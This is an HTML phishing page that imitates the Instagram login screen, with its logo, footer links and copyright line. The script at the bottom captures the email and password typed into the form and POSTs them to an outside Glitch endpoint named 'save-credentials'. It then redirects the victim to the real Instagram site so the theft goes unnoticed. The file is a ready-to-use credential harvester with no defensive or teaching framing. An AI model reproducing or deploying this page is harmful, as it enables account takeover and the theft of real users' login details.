<!DOCTYPE html>
<html lang="en">
<head>
        
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial_scale=1.0" />
    <title>Instagram - Log in</title>
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/media-queries.css" />
    <link rel="icon" href="photos/insta-icon.jpg" />
</head>
<body>
    <main>
        <div class="log-in-container">
            <div class="log-in">
                <img src="photos/logo.png" class="logo"/>
                <form id="log-in-form" class="log-in-form">
                    <input type="text" id="email" placeholder="Phone number, username or email" />
                    <input type="password" id="password" placeholder="Password" />
                    <button type="submit" class="log-in-button">Log In</button>
                </form>

                <span class="or-divider">OR</span> 
                <div class="fb-login">
                    <a href="#">
                        <img src="photos/facebook-icon.png">
                        <span>Log in with Facebook</span>
                    </a>
                </div>
                <a href="#">Forgot password?</a>
            </div>
            <div class="sign-up">
                <span>Don't have an account
                    <a href="#">Sign up</a>
                </span>
            </div>
            <div class="get-the-app">
                <span>Get the app</span>
                <div class="app-images">
                    <a href="#"><img src="photos/applestore.png" /></a>
                    <a href="#"><img src="photos/googlestore.png" /></a>
                </div>
            </div>

        </div>
        <div class="phones-container">
            <img src="photos/phones.png" />
        </div>
    </main>
    <footer>
        <ul class="footer-links">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">JOBS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">TOP</a></li>
            <li><a href="#">ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <span class="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
    </footer>
    <script>
        document.getElementById('log-in-form').addEventListener('submit', function(event) {
          event.preventDefault();
      
          const email = document.getElementById('email').value;
          const password = document.getElementById('password').value;
      
          if (email.trim() === "" || password.trim() === "") {
            alert("Certains champs sont vides.");
            return;
          }
      
          fetch('https://helix-shore-fright.glitch.me/save-credentials', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ email, password })
          })
          .then(response => response.json())
          window.location.href = 'https://www.instagram.com/';
        });
      </script>      
</body>

</html>
